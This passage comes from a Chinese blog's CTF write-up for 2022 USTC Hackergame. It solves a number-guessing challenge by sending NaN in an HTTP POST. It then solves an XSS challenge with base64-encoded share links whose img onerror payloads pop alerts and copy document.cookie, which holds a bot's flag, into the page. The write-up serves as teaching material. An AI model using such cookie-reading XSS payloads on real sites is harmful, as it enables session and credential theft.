      <span class="token keyword">case</span> <span class="token string">"GET /github-markdown.css"</span> <span class="token operator">-&gt;</span> <span class="token function">style</span><span class="token punctuation">(</span>exchange<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token string">"GET /GuessNumber.java"</span> <span class="token operator">-&gt;</span> <span class="token function">source</span><span class="token punctuation">(</span>exchange<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token string">"POST /state"</span> <span class="token operator">-&gt;</span> <span class="token function">update</span><span class="token punctuation">(</span>exchange<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token string">"GET /state"</span> <span class="token operator">-&gt;</span> <span class="token function">collect</span><span class="token punctuation">(</span>exchange<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span> <span class="token operator">-&gt;</span> <span class="token function">bad</span><span class="token punctuation">(</span>exchange<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221024182547958.png"></p>
<p>这里需要 <code>isLess</code> 和 <code>isMore</code> 均为假，一种情况肯定是一次猜对了，还有一种情况就是比较出错返回 false</p>
<p>一想，是不是 NaN (Not a Number) 呢？</p>
<p>试一下，果然！</p>
<p>构造 payload</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/state</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">202.38.93.111:18000</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://202.38.93.111:18000/</span></span>
<span class="token header"><span class="token header-name keyword">authorization</span><span class="token punctuation">:</span> <span class="token header-value">Bearer xxxxxxxxxxxxxxxxxxxxxx</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain;charset=UTF-8</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">33</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://202.38.93.111:18000</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">session=xxxxxxxxxxxxxx</span></span>

&lt;state&gt;&lt;guess&gt;NaN&lt;/guess&gt;&lt;/state&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>打过去，再访问 <a target="_blank" rel="noopener" href="http://202.38.93.111:18000/state">http://202.38.93.111:18000/state</a></p>
<p>返回包里就有 flag 了</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" ?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>36<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>passed</span><span class="token punctuation">&gt;</span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>passed</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>talented</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>talented</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>flag</span><span class="token punctuation">&gt;</span></span>flag{gu3ss-n0t-a-numb3r-1nst3ad-f9c5df036092eada}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>flag</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>





<h2 id="微积分计算小练习"><a href="#微积分计算小练习" class="headerlink" title="微积分计算小练习"></a>微积分计算小练习</h2><blockquote>
<p>小 X 作为某门符号计算课程的助教，为了让大家熟悉软件的使用，他写了一个小网站：上面放着五道简单的题目，只要输入姓名和题目答案，提交后就可以看到自己的分数。</p>
<p><a target="_blank" rel="noopener" href="http://202.38.93.111:10056/?token=36:MEQCIEX+HCR1lwg9wNrFZjgZn+XMvjWUHXYpg2yf0S74pZvKAiBiQh1FBDByHPJH9vMM8mAgiuiCR0z9nI4OMsglUeLH+w==">点击此链接访问练习网站</a></p>
<p>想起自己前几天在公众号上学过的 Java 设计模式免费试听课，本着前后端离心（咦？是前后端离心吗？还是离婚？离。。离谱？总之把功能能拆则拆就对啦）的思想，小 X 还单独写了一个程序，欢迎同学们把自己的成绩链接提交上来。</p>
<p>总之，因为其先进的设计思想，需要同学们做完练习之后手动把成绩连接贴到这里来：</p>
<p><a target="_blank" rel="noopener" href="http://202.38.93.111:10057/?token=36:MEQCIEX+HCR1lwg9wNrFZjgZn+XMvjWUHXYpg2yf0S74pZvKAiBiQh1FBDByHPJH9vMM8mAgiuiCR0z9nI4OMsglUeLH+w==">点击此链接提交练习成绩 URL</a></p>
<p>点击下方的「打开/下载题目」按钮，查看接收成绩链接的程序的源代码。</p>
<p>提示：</p>
<ol>
<li>不必输入自己真实的姓名；</li>
<li>根据比赛规则，<strong>请勿分享自己的链接，或点击其他人分享的链接</strong>。</li>
</ol>
</blockquote>
<p>是 XSS 啊，给了 bot 源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Copyright 2022 USTC-Hackergame</span>
<span class="token comment"># Copyright 2021 PKU-GeekGame</span>
<span class="token comment"># </span>
<span class="token comment"># Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:</span>
<span class="token comment"># </span>
<span class="token comment"># 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.</span>
<span class="token comment"># </span>
<span class="token comment"># 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.</span>
<span class="token comment"># </span>
<span class="token comment"># 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.</span>
<span class="token comment"># </span>
<span class="token comment"># THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span>

<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver
<span class="token keyword">import</span> selenium
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> time
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> os
<span class="token comment"># secret.py will NOT be revealed to players</span>
<span class="token keyword">from</span> secret <span class="token keyword">import</span> FLAG<span class="token punctuation">,</span> BOT_SECRET

LOGIN_URL <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'http://web/?bot=</span><span class="token interpolation"><span class="token punctuation">{</span>BOT_SECRET<span class="token punctuation">}</span></span><span class="token string">'</span></span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Please submit your quiz URL:'</span><span class="token punctuation">)</span>
url <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'&gt; '</span><span class="token punctuation">)</span>

<span class="token comment"># URL replacement</span>
<span class="token comment"># In our environment bot access http://web</span>
<span class="token comment"># If you need to test it yourself locally you should adjust LOGIN_URL and remove the URL replacement source code</span>
<span class="token comment"># and write your own logic to use your own token to "login" with headless browser</span>
parsed <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
parsed <span class="token operator">=</span> parsed<span class="token punctuation">.</span>_replace<span class="token punctuation">(</span>netloc<span class="token operator">=</span><span class="token string">"web"</span><span class="token punctuation">,</span> scheme<span class="token operator">=</span><span class="token string">"http"</span><span class="token punctuation">)</span>
url <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlunparse<span class="token punctuation">(</span>parsed<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Your URL converted to </span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    options <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>ChromeOptions<span class="token punctuation">(</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">)</span> <span class="token comment"># sandbox not working in docker</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--headless'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--disable-gpu'</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--user-data-dir=/dev/shm/user-data'</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'TMPDIR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/dev/shm/"</span>
    options<span class="token punctuation">.</span>add_experimental_option<span class="token punctuation">(</span><span class="token string">'excludeSwitches'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'enable-logging'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">with</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>options<span class="token operator">=</span>options<span class="token punctuation">)</span> <span class="token keyword">as</span> driver<span class="token punctuation">:</span>
        ua <span class="token operator">=</span> driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">'return navigator.userAgent'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">' I am using'</span><span class="token punctuation">,</span> ua<span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'- Logining...'</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">' Putting secret flag...'</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'document.cookie="flag=</span><span class="token interpolation"><span class="token punctuation">{</span>FLAG<span class="token punctuation">}</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'- Now browsing your quiz result...'</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            greeting <span class="token operator">=</span> driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"return document.querySelector('#greeting').textContent"</span></span><span class="token punctuation">)</span>
            score <span class="token operator">=</span> driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"return document.querySelector('#score').textContent"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> selenium<span class="token punctuation">.</span>common<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>JavascriptException<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'JavaScript Error: Did you give me correct URL?'</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"OK. Now I know that:"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>greeting<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>score<span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'- Thank you for joining my quiz!'</span><span class="token punctuation">)</span>

<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ERROR'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">import</span> traceback
    traceback<span class="token punctuation">.</span>print_exception<span class="token punctuation">(</span><span class="token operator">*</span>sys<span class="token punctuation">.</span>exc_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> limit<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> chain<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/106.0.5249.119 Safari/537.36</p>
<p>这个 share 链接是个 base64 编码的以 <code>分数:姓名</code> 格式的字符串</p>
<p>前端的 script 如下</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">var</span> url <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">;</span>
<span class="token keyword">var</span> input <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
input<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'readonly'</span><span class="token punctuation">,</span> <span class="token string">'readonly'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
input<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'value'</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
input<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">execCommand</span><span class="token punctuation">(</span><span class="token string">'copy'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
document<span class="token punctuation">.</span><span class="token function">execCommand</span><span class="token punctuation">(</span><span class="token string">'copy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'已复制到剪贴板'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"#copy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> click<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> queryString <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">;</span>
<span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>queryString<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> result <span class="token operator">=</span> urlParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> b64decode <span class="token operator">=</span> <span class="token function">atob</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> colon <span class="token operator">=</span> b64decode<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> score <span class="token operator">=</span> b64decode<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> colon<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> username <span class="token operator">=</span> b64decode<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>colon <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"#greeting"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"您好，"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"！"</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"#score"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"您在练习中获得的分数为 &lt;b&gt;"</span> <span class="token operator">+</span> score <span class="token operator">+</span> <span class="token string">"&lt;/b&gt;/100。"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不懂为啥，如果 payload 这里面如果带了 <code>&lt;script&gt;</code> 还是啥的一些字符会报错 Internal Server Error，应该是 flask 后端炸了的感觉</p>
<p>随意改了改 payload，可以实现弹窗</p>
<pre class="line-numbers language-none"><code class="language-none">100&lt;/b&gt;&lt;img/src=1 onerror=alert(1)&gt;:miao<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="http://202.38.93.111:10056/share?result=MTAwPC9iPjxpbWcvc3JjPTEgb25lcnJvcj1hbGVydCgxKT46bWlhbw==">http://202.38.93.111:10056/share?result=MTAwPC9iPjxpbWcvc3JjPTEgb25lcnJvcj1hbGVydCgxKT46bWlhbw==</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221025053508654.png"></p>
<p>构造 payload </p>
<pre class="line-numbers language-none"><code class="language-none">100&lt;/b&gt;&lt;img/src=1 onerror="document.querySelector('#score').textContent=document.cookie"&gt;:miao<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="http://202.38.93.111:10056/share?result=MTAwPC9iPjxpbWcvc3JjPTEgb25lcnJvcj0iZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI3Njb3JlJykudGV4dENvbnRlbnQ9ZG9jdW1lbnQuY29va2llIj46bWlhbw==">http://202.38.93.111:10056/share?result=MTAwPC9iPjxpbWcvc3JjPTEgb25lcnJvcj0iZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI3Njb3JlJykudGV4dENvbnRlbnQ9ZG9jdW1lbnQuY29va2llIj46bWlhbw==</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221025053816096.png"></p>
<p>打远程</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221025053644001.png"></p>
<p><code>flag{xS5_1OI_is_N0t_SOHARD_e3c7ac115c}</code></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这一篇里是一些难度稍微简单的题目，后面两篇主要包括下面这些题，难度大一些（</p>
<ul>
<li><p><strong><a href="https://miaotony.xyz/2022/10/30/CTF_2022Hackergame_0x02/">CTF | 2022 USTC Hackergame WriteUp 0x02</a></strong></p>
<p>企鹅拼盘，火眼金睛的小 E，安全的在线测评，杯窗鹅影，蒙特卡罗轮盘赌，片上系统，看不见的彼方</p>
</li>
<li><p><strong><a href="https://miaotony.xyz/2022/10/31/CTF_2022Hackergame_0x03/">CTF | 2022 USTC Hackergame WriteUp 0x03</a></strong></p>
<p>传达不到的文件，二次元神经网络，你先别急，惜字如金，量子藏宝图</p>
</li>
</ul>
<p><em>（溜了溜了喵</em></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz/2022/10/30/CTF_2022Hackergame_0x01/">https://miaotony.xyz/2022/10/30/CTF_2022Hackergame_0x01/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特别声明外，均采用
                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                                <a href="/tags/WriteUp/">
                                    <span class="chip bg-color">WriteUp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">打赏一下让我来点好吃好玩的呗~</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <!-- 
                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li> 
                        -->
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <!-- 
                        <div id="alipay">
                        <img src="/" class="reward-img" alt="支付宝打赏二维码">
                        </div> 
                -->
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.min.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

